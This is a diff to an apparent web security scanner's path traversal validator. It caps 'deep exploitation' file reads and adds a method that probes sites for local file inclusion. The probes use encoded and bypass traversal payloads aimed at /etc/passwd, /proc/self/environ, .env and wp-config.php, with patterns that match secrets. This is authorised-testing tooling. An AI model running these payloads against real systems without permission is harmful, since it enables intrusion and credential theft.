@@ -526,6 +526,7 @@ class PathTraversalValidator:
         working_payload: str,
         technique: str,
         headers: Optional[dict],
+        max_files: int = 6,
     ) -> Optional[dict]:
         """Deep exploitation: read multiple system/config files after LFI confirmed.
 
@@ -542,7 +543,7 @@ class PathTraversalValidator:
         if not traversal_prefix:
             traversal_prefix = "../" * 10  # fallback to deep traversal
 
-        for target_file, evidence_key, pattern in DEEP_EXPLOITATION_FILES:
+        for target_file, evidence_key, pattern in DEEP_EXPLOITATION_FILES[:max(1, max_files)]:
             # Build payload by replacing the target file
             payload = f"{traversal_prefix}{target_file.lstrip('/')}"
 
@@ -577,6 +578,7 @@ class PathTraversalValidator:
         working_payload: str,
         technique: str,
         headers: Optional[dict],
+        max_files: int = 6,
     ) -> Optional[dict]:
         """Deep exploitation for URL-path-based LFI — read additional files."""
         exploitation: Dict[str, Any] = {
@@ -589,7 +591,7 @@ class PathTraversalValidator:
         if not traversal_prefix:
             traversal_prefix = "../" * 10
 
-        for target_file, evidence_key, pattern in DEEP_EXPLOITATION_FILES:
+        for target_file, evidence_key, pattern in DEEP_EXPLOITATION_FILES[:max(1, max_files)]:
             payload = f"{traversal_prefix}{target_file.lstrip('/')}"
             test_url = f"{base_url}{path_prefix}{payload}"
 
@@ -732,6 +734,139 @@ class PathTraversalValidator:
                 candidate.reproduction_steps.append(
                     f"10. OS: {expl['os_pretty_name']}"
                 )
+
+    async def validate_direct_paths(
+        self,
+        base_url: str,
+        subdirectories: Optional[List[str]] = None,
+        headers: Optional[dict] = None,
+        max_subdirectories: int = 8,
+        max_requests: int = 72,
+    ) -> List[PathTraversalCandidate]:
+        """Test LFI via direct URL paths (e.g., http://example.com/etc/passwd)."""
+        candidates: List[PathTraversalCandidate] = []
+        parsed = urlparse(base_url)
+        clean_base = f"{parsed.scheme or 'https'}://{parsed.netloc}"
+        request_budget = max(1, int(max_requests or 1))
+        requests_made = 0
+
+        async def guarded_request(test_url: str) -> Optional[httpx.Response]:
+            nonlocal requests_made
+            if requests_made >= request_budget:
+                return None
+            requests_made += 1
+            return await self._send_request(test_url, headers=headers)
+
+        # Collect paths to test
+        paths_to_test = ["/"]
+        if subdirectories:
+            for sd in subdirectories:
+                if len(paths_to_test) > max(1, max_subdirectories):
+                    break
+                if not sd:
+                    continue
+                # Normalize subdirectory path
+                sd_path = urlparse(sd).path
+                if sd_path:
+                    # Keep path parts
+                    parts = [p for p in sd_path.split("/") if p]
+                    accumulated = ""
+                    for p in parts:
+                        accumulated += f"/{p}"
+                        if accumulated not in paths_to_test:
+                            paths_to_test.append(accumulated)
+                        if len(paths_to_test) > max(1, max_subdirectories):
+                            break
+
+        # Targets to probe
+        targets = [
+            ("etc/passwd", LINUX_TARGETS[0][1], "/etc/passwd"),
+            ("etc/hostname", LINUX_TARGETS[1][1], "/etc/hostname"),
+            ("proc/version", LINUX_TARGETS[3][1], "/proc/version"),
+            ("proc/self/environ", LINUX_TARGETS[4][1], "/proc/self/environ"),
+            (".env", re.compile(r"(DB_|APP_|SECRET|KEY|PASSWORD)", re.I), ".env"),
+            ("config.php", re.compile(r"(<\?php|define\s*\(|db_)", re.I), "config.php"),
+            ("wp-config.php", re.compile(r"(<\?php|define\s*\(\s*['\"]DB_)", re.I), "wp-config.php"),
+        ]
+
+        # For each base path, try to probe LFI
+        for path_prefix in paths_to_test:
+            if requests_made >= request_budget:
+                break
+            if not path_prefix.endswith("/"):
+                path_prefix += "/"
+
+            # Baseline to avoid catch-all false positives
+            baseline_url = f"{clean_base}{path_prefix}nonexistent_file_rand_{hashlib.md5(path_prefix.encode()).hexdigest()[:8]}"
+            baseline_resp = await guarded_request(baseline_url)
+            baseline_body = baseline_resp.text if baseline_resp else ""
+
+            for filename, pattern, desc in targets:
+                if requests_made >= request_budget:
+                    break
+                # Variations of traversal/encoding
+                variations = [
+                    (filename, "direct"),
+                    (f"../../../../../../../../{filename}", "standard_traversal"),
+                    (f"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{filename}", "url_encoded"),
+                    (f"..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{filename}", "double_encoded"),
+                    (f"..;/..;/..;/..;/..;/..;/..;/..;/{filename}", "tomcat_bypass"),
+                    (f"..\\..\\..\\..\\..\\..\\..\\..\\{filename}", "backslash"),
+                ]
+
+                for payload, technique in variations:
+                    if requests_made >= request_budget:
+                        break
+                    test_url = f"{clean_base}{path_prefix}{payload}"
+                    resp = await guarded_request(test_url)
+                    if not resp or resp.status_code not in (200, 301, 302):
+                        continue
+
+                    body = resp.text
+                    if pattern.search(body) and not pattern.search(baseline_body):
+                        if "config" in filename and not ("<?php" in body or "define" in body or "DB_" in body or "APP_" in body):
+                            continue
+
+                        poc_curl = f"curl -ksSL '{test_url}'"
+
+                        # Deep exploitation
+                        working_prefix = payload[:-len(filename)]
+                        exploitation = await self._exploit_deep_path_read(
+                            clean_base,
+                            path_prefix,
+                            working_prefix + "etc/passwd",
+                            technique,
+                            headers,
+                            max_files=6,
+                        )
+
+                        candidate = PathTraversalCandidate(
+                            url=test_url,
+                            parameter="DIRECT_PATH",
+                            location="path",
+                            probe=payload,
+                            technique=technique,
+                            target_file=desc,
+                            confidence="EXPLOITED" if exploitation else "CONFIRMED",
+                            poc_curl=poc_curl,
+                            exploitation_data=exploitation or {},
+                            evidence={
+                                "status_code": resp.status_code,
+                                "indicator": f"Direct LFI {desc} confirmed",
+                                "response_sample": body[:500],
+                                "response_length": len(body),
+                                "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
+                                "traversal_url": test_url,
+                                "technique": technique,
+                                "poc_curl": poc_curl,
+                                "evidence_level": "E4" if exploitation else "E3",
+                            },
+                        )
+                        self._enrich_candidate(candidate, test_url, "DIRECT_PATH", "path")
+                        candidates.append(candidate)
+                        break
+
+        return candidates
 
     @staticmethod
     def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
